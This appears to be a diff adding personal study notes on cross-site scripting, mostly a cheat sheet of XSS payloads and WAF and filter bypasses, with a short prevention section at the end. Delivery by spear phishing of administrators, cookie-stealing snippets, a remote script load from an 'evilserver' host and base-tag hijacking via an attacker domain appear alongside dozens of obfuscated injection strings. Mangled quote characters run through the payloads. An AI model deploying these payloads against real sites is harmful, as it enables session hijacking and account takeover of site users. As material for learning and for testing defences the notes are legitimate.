@@ -1,0 +1,309 @@
+[ xss ]
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~       Serundeng Sapi - Web Application Security        ~
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+[*] reflected xss; stored xss;dom-based xss(like reflected but not in the response, the user's browser executes the script because it copies data from the url)
+
+[###] Attacks:
+[*] defacement
+[*] webmails
+[*] trojan functionality
+[*] induce users to submit forms,...
+[*] trust relationships: 
+    >>> autocomplete enabled in the autocomplete cache, instantiating the relevant form, wait for the browser to autocomplete its contents, and querying the field values.
+    >>> Trusted Sites >> arbitrary code execution on the computer of the victim
+    >>> ActiveX controls circumvented.
+
+further payloads:keylogger,port-scanning on the local network, browser's history,...
+
+[###] delivery: spear phishing (administrators are the targets).
+IMG tag is enough for exploiting a vulnerable XSS on a page.
+When the parameters vulnerable must be exploited with post, post method can be implemented in malicious webpages with forms submitted by Javascript.
+banner ads...
+email services like "tell a friend" can be used for delivery of malicious urls -often more reliable...
+
+[###] XSS stored, entry points: 
+[-] personal information fields.
+[-] files, docs uploaded- names and contents.
+[-] feedback or questions, forums...
+[-] messages,status updates,comments,...
+[-] logs such as Referer, User-Agent...
+
+[###] identification:
+standard: "><script>alert(1)</script>
+
+common filters are of: <script> the script tag, " < > /
+some examples of circumvention:
+"><script >alert(1)</script >
+"><scRipT>alert(1)</sCripT>
+"%3e%3cscript%3ealert(1)%3c/script%3e
+%00"><script>alert(1)</script>
+
+dom-based XSS vulnerabilities requires some other action from the user.
+
+
+[###] approach:
+
+[-] find entry points mapping the application
+[-] submit garbage everywhere one by one and see if it is returned in the response.
+[-] change request method in BURP tell us if a POST request can be delivered as GET.
+because the attack vectors for GET requests is larger than for POST.
+[-] common XSS vulnerabilities are in the Header: Referer, Host, User-Agent...
+
+[*] Recognize tag attributes like input:
+
+<input type="text" name="address" value="garbage">
+custom injection on the input tag: " onfocus="alert(1)
+<script> var a = "garbage"; var b=...</script>
+custom injection: ";alert(1);var foo="
+                  ";alert(1);// (comment out the rest of the line)
+
+<a href="">click...</a>
+custom injection: javascript:alert(1);
+                  #" onclick="javascript:alert(1)
+
+
+URL-encode characters such as &=+; and space.
+
+[###] Defensive Filters:
+
+[**] WAF or application anti-XSS filters, signature-based:
+    error messages tipically
+    <script blocked for example...
+    BURP Repeater. 
+    
+    >>>> convoluted syntax:
+    <object data="data:text/html,<script>alert(1)</script>">
+    <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+    <a href=â€data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==â€>  <---------base64 encode the script
+
+    >>>> event-handlers no user interaction:  
+    <xml onreadystatechange=alert(1)>
+    <style onreadystatechange=alert(1)>
+    <iframe onreadystatechange=alert(1)>                 
+    <object onerror=alert(1)>
+    <object type=image src=valid.gif onreadystatechange=alert(1)></object>
+    <img type=image src=valid.gif onreadystatechange=alert(1)>
+    <input type=image src=valid.gif onreadystatechange=alert(1)>
+    <isindex type=image src=valid.gif onreadystatechange=alert(1)>
+    <script onreadystatechange=alert(1)>
+    <bgsound onpropertychange=alert(1)>
+    <body onbeforeactivate=alert(1)>
+    <body onactivate=alert(1)>
+    <body onfocusin=alert(1)>
+
+    >>>> autofocus attribute automatically trigger events:
+    <input autofocus onfocus=alert(1)>
+    <input onblur=alert(1) autofocus><input autofocus>
+    <body onscroll=alert(1)><br><br>...<br><input autofocus>
+
+
+    >>>> event-handlers in closing tags:
+    </a onmousemove=alert(1)>
+
+    >>>> html5 event-handlers:
+    <video src=1 onerror=alert(1)>
+    <audio src=1 onerror=alert(1)>
+
+    >>>> pseudo-protocols:
+    <object data=javascript:alert(1)>
+    <iframe src=javascript:alert(1)>
+    <embed src=javascript:alert(1)>
+
+    >>>> also vbs (instead of javascript for IE browsers)
+
+    <form id=test /><button form=test formaction=javascript:alert(1)>
+    <event-source src=javascript:alert(1)>
+
+    >>>> dinamically evaluated styles:
+    <x style=behavior:url(#default#time2) onbegin=alert(1)>
+
+
+    >>>> insert unusual characters at key points within the HTML:
+    <iMg onerror=alert(1) src=a>
+    <[%00]img onerror=alert(1) src=a> <----------null bytes at any position, because WAFs are usually in native code for performance %00 terminates the string
+    <i[%00]mg onerror=alert(1) src=a>
+    <img o[%00]nerror=alert(1) src=a>
+
+    >>>> The <base> tag is used to specify a URL that the browser should use
+    to resolve any relative URLs that appear subsequently within the page.
+    <base href=â€http://mdattacker.net/badscripts/â€>
+    ...
+    <script src=â€goodscript.jsâ€></script>
+
+    <img/onerror=alert(1) src=a>
+    <img[%09]onerror=alert(1) src=a>
+    <img[%0d]onerror=alert(1) src=a>
+    <img[%0a]onerror=alert(1) src=a>
+    <img/â€onerror=alert(1) src=a>
+    <img/â€™onerror=alert(1) src=a>
+    <img/anyjunk/onerror=alert(1) src=a>
+    <script/anyjunk>alert(1)</script>
+
+    >>>> Attributes can be delimited with single,double quotes and backticks...
+    <img onerror=â€alert(1)â€src=a>
+    <img onerror=â€™alert(1)â€™src=a>
+    <img onerror=`alert(1)`src=a>
+
+    >>>> WAF searching on.. attributes may not find this:
+    <img src=`a`onerror=alert(1)>
+
+    >>>> combined it results in nowhitespaces payload:
+    <img/onerror=â€alert(1)â€src=a>
+
+    >>>> Attributes values can be HTML-encoded, good obfuscation mechanism:
+    <img onerror=a[%00]lert(1) src=a>
+    <img onerror=a&#x6c;ert(1) src=a>
+    <iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29; >
+    
+    >>>> decimal or hexadecimal format and superfluous leading zeros:
+    <img onerror=a&#x06c;ert(1) src=a>
+    <img onerror=a&#x006c;ert(1) src=a>
+    <img onerror=a&#x0006c;ert(1) src=a>
+    <img onerror=a&#108;ert(1) src=a>
+    <img onerror=a&#0108;ert(1) src=a>
+    <img onerror=a&#108ert(1) src=a>
+    <img onerror=a&#0108ert(1) src=a>
+
+    >>>> double URL-encoding:
+    %253cimg%20onerror=alert(1)%20src=a%253e
+    if it is decoded before being sent to the filter: the filter see: %3cimg onerror=alert(1) src=a%3e which has no <,> characters.
+    
+    >>>> some application frameworks translates unicode characters into the nearest ASCII equivalent:
+    Â«img onerror=alert(1) src=aÂ»
+    <<script>alert(1);//<</script>
+
+    >>>> ECMAScript:
+    <script<{alert(1)}/></script>
+
+    >>>> other character sets like UTF-7,US-ASCII,UTF-16....
+    with Content-Type header or HTML metatag to enable the browser renders the response as required.
+    <img src=â€image.gifâ€ alt=â€[input1]â€ /> ... [input2]
+    In the Shift-JIS character set, various raw byte values, including 0xf0 , are used to signal a 2-byte character that is composed of that byte and the following byte. Hence, when the browser processes input1 , the quotation mark following the 0xf0 byte is interpreted as part of a 2-byte character and therefore does not delimit the attribute value.
+
+    >>>> Unicode escapes can be used to represent characters within JavaScript key-words
+    <script>a\u006cert(1);</script>
+    
+    >>>> Within JavaScript strings, you can use Unicode escapes, hexadecimal escapes, and octal escapes:
+    <script>eval(â€˜a\u006cert(1)â€™);</script>
+    <script>eval(â€˜a\x6cert(1)â€™);</script>
+    <script>eval(â€˜a\154ert(1)â€™);</script>
+    <script>eval(â€˜a\l\ert\(1\)â€™);</script>
+    <script>eval(â€˜alâ€™+â€™ert(1)â€™);</script>
+
+    >>>> dynamic construction of commands:
+    <script>eval(String.fromCharCode(97,108,101,114,116,40,49,41));</script>
+    <script>eval(atob(â€˜amF2YXNjcmlwdDphbGVydCgxKQâ€™));</script>
+    
+    >>>> eval blocked, but there is multiple ways to execute commands in string format:
+    <script>â€™alert(1)â€™.replace(/.+/,eval)</script>
+    <script>function::[â€˜alertâ€™](1)</script>
+
+    >>>> dots blocked:
+    <script>alert(document[â€˜cookieâ€™])</script>
+    <script>with(document)alert(cookie)</script>
+
+    >>>> on IE, VBScript can be used also:
+    <script language=vbs>MsgBox 1</script>
+    <img onerror=â€vbs:MsgBox 1â€ src=a>
+    <img onerror=MsgBox+1 language=vbs src=a>
+    
+    [!!!!] VBScript is not case-sensitive, unlike JS: further attacks if any kind of toUPPER or lower case is implemented on the filter:
+    
+    >>>> also, combine JS and VBS:    
+    <script>execScript(â€œMsgBox 1â€,â€vbscriptâ€);</script>
+    <script language=vbs>execScript(â€œalert(1)â€)</script>
+        
+        [+++] nested example:
+    <script>execScript(â€˜execScriptâ€œalert(1)â€,â€javascriptâ€â€™,â€vbscriptâ€);</script>
+    test@example.org < email.txt
+    if you need to use JS, VBS can help:
+    <SCRIPT LANGUAGE=VBS>EXECSCRIPT(LCASE(â€œALERT(1)â€)) </SCRIPT>
+    <IMG ONERROR=â€VBS:EXECSCRIPT LCASE(â€˜ALERT(1)â€™)â€ SRC=A>
+
+        [+++] On Internet Explorer, you can use Microsoftâ€™s custom script-encoding algorithm to hide the contents of scripts and potentially bypass some input fi lters:
+    <img onerror=â€VBScript.Encode:#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@â€ src=a>
+    <img language=â€JScript.Encodeâ€ onerror=â€#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@â€ src=a>
+
+    [**] Sanitization: HTML-encoding of characters prevents execution of javascript: < &lt, > &gt
+
+    >>> check if all instances are sanitized:
+        <script><script>alert(1)</script>
+        <scr<script>ipt>alert(1)</script>
+
+    >>> check if \ (escape) is being sanitized, if the injection point is in quotation marks and " is being escaped.
+    
+         try: foo&apos;; alert(1);// 
+         if quotations marks and \ are being escaped, it may succeed because some browsers perform a HTML decode before the event-handler is executed
+         <a href=â€#â€ onclick=â€var a = â€˜foo&apos;; alert(1);//â€™; ...
+    
+    [**] length limits:
+    >>> use javascript packers that erase unnecessary whitespaces and put a scripts in a single line.
+    >>> <script src=http://evilserver/a.js></script> <---load a remote script
+    >>> span attacks accross parameters:
+        <input type=â€hiddenâ€ name=â€page_idâ€ value=â€â€><script>/*â€>
+        <input type=â€hiddenâ€ name=â€seedâ€ value=â€*/alert(document.cookie);/*â€>
+        <input type=â€hiddenâ€ name=â€modeâ€ value=â€*/</script>â€>
+    >>> convert a reflect XSS to DOM-based XSS:
+        <script>eval(location.hash.slice(1))</script>
+        http://mdsec.net/error/5/Error.ashx?message=<script>eval(location.hash.substr(1))</script>#alert(â€˜long script here ......â€™)
+        http://mdsec.net/error/5/Error.ashx?message=<script>eval(unescape(location))</script>#%0Aalert(â€˜long script here ......â€™)
+
+
+[**] XSS Exploits:
+        iframe exploits log all activity of the user on the page using a iframe tag that covers all the browser's window.
+    cookies, referer headers
+    via xml requests make by the browser
+       
+[**] browser XSS filters: cross-domain only. ~ same techniques described earlier.
+
+[**] webmail stored XSS. Use all the techniques reviewed.
+    sendmail -t test@example.org < email.txt
+    email.txt---
+    MIME-Version: 1.0
+    From: test@example.org
+    Content-Type: text/html; charset=us-ascii
+    Content-Transfer-Encoding: 7bit
+    Subject: XSS test
+    <html>
+    <body>
+    <img src=``onerror=alert(1)>
+    </body>
+    </html>
+    .
+
+[**] stored XSS in uploaded files: 
+        try send a .jpeg file and write javascript on it, if it is processed, the application/browser is vulnerable.
+    Hybrid files attacks: GIFAR file java archive embedded to a gif. applet or object tag to load the gifar file from an external site and steal the session on the vulnerable page.
+    ajax cross-domain requests are possible with the permission of the requested domain
+    http://wahh-app.com/#http://evil.com/image.jpg <---- rfi may be possible, session hijacking in wahh-app.com
+
+[**] dom-based xss filters may be circumvented reviewing the code with a debugger, same payloads earlier or:
+    http://mdsec.net/error/82/Error.ashx?message=Sorry%2c+an+error+occurred#<script>alert(1)</script>
+    http://mdsec.net/error/76/Error.ashx?message=Sorry%2c+an+error+occurred&foo=<script>alert(1)</script>
+    http://mdsec.net/error/79/Error.ashx?foomessage=<script>alert(1)</script>&message=Sorry%2c+an+error+occurred
+    http://mdsec.net/error/79/Error.ashx#message=<script>alert(1)</script>
+
+[###] prevention
+[*]validate input:
+    (1)data not too long
+    (2)set of chars
+    (3)regular expressions
+
+[*] validate output, html encoding. 
+  Include & and ; in the entities for prevent a custom encoding.
+Html-encode the data that is going to be on the server response
+Entities &lt;&gt;&quot,&apos for <,>,",'
+
+[*] applications that let users type html markup:
+    [**] whitelists of tags and attributes used
+        prevent payloads like:
+        <b style=behaviour:url(#default#time2) onbegin=alert(1)>
+        <i onclick=alert(1)>Click</i>
+        <a href=â€data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==â€>Click</a>
+    [**] use frameworks.
+    [**] other possibility is to use a limited syntax intermediate language (markdown...)
+
+[*] dom-based xss:
+the same controls(regular expressions,html encode...) but on the client-side.
+document.createTextNode(str)); useful for html encoding
